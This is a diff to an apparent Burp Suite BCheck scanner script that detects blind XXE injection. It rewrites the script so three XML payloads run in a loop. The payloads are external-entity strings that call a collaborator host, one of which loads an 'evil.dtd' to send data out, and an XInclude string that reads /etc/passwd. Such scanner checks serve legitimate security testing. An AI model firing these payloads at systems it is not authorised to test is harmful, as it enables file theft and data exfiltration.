@@ -5,15 +5,16 @@ metadata:
     author: "BCheck Arsenal"
     tags: "xxe", "blind", "oob"
 
+run for each:
+    payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR/xxe\">%xxe;]><foo>test</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://COLLABORATOR/evil.dtd\">%dtd;%send;]><foo>test</foo>",
+        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"
+
 given insertion point then
     send payload:
-        replacing: "{insertion_point}"
-        following replacements:
-            - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR/xxe\">%xxe;]><foo>test</foo>"
-            - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://COLLABORATOR/evil.dtd\">%dtd;%send;]><foo>test</foo>"
-            - "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"
+        replacing: {payload}
 
-    if {check.response} matches "(ENTITY|DOCTYPE|XInclude|xi:include)" then
+    if {latest.response} matches "(ENTITY|DOCTYPE|XInclude|xi:include)" then
         report issue:
             severity: high
             confidence: tentative
